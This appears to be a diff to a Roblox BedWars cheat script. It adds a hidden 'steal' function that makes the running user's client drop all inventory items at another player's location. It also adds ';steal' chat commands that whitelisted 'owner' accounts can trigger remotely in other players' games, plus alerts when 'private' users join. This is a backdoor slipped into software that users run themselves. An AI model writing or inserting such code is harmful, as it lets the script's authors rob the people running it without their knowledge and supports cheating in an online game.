@@ -256,6 +256,23 @@ end
 function funcs:void()
 	lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -35, 0)
 end
+function funcs:steal()
+        if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+	    GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+	    task.wait(1)
+	end
+	for i,v in pairs(currentinventory.inventory.items) do 
+	    local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+		item = v.tool,
+		amount = v.amount ~= math.huge and v.amount or 99999999
+	    })
+	    if e then 
+		e.CFrame = plr.Character.HumanoidRootPart.CFrame
+	    else
+		v.tool:Destroy()
+	    end
+	end
+end
 function sysmsg(text, color)
     game.StarterGui:SetCore(
         "ChatMakeSystemMessage",
@@ -281,6 +298,19 @@ spawn(function()
 	end)
 end)
 
+spawn(function()
+	for i,v in pairs(game:GetService("Players"):GetChildren()) do
+	if table.find(whitelist.Privates,v.UserId) then
+			sysmsg("{DETECTED} PRIVATE USER WAS IN YOUR GAME")
+		end
+	end
+	game:GetService("Players").ChildAdded:Connect(function(v)
+		if table.find(whitelist.Privates,v.UserId) then
+			sysmsg("[DETECTED] PRIVATE USER WAS IN YOUR GAME!")
+		end
+	end)
+end)
+
 for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	v.Chatted:Connect(function(a) 
 		if table.find(whitelist.Owners,v.UserId) then
@@ -320,6 +350,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:ban()
 			elseif a == ";lobby" then
 				funcs:lobby()
+			elseif a == ";steal" then
+				funcs:steal()
 			end
 		end
 	end)
@@ -361,6 +393,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:ban()
 			elseif a == ";lobby" then
 				funcs:lobby()
+                        elseif a == ";steal" then
+				funcs:steal()
 			end
 		end
 	end)
@@ -405,6 +439,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:ban()
 			elseif a == ";lobby" then
 				funcs:lobby()
+		        elseif a == ";steal" then
+				funcs:steal()
 			end
 		end
 	end)
@@ -446,6 +482,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:ban()
 			elseif a == ";lobby" then
 				funcs:lobby()
+			elseif a == ";steal" then
+				funcs:steal()
 			end
 		end
 	end)
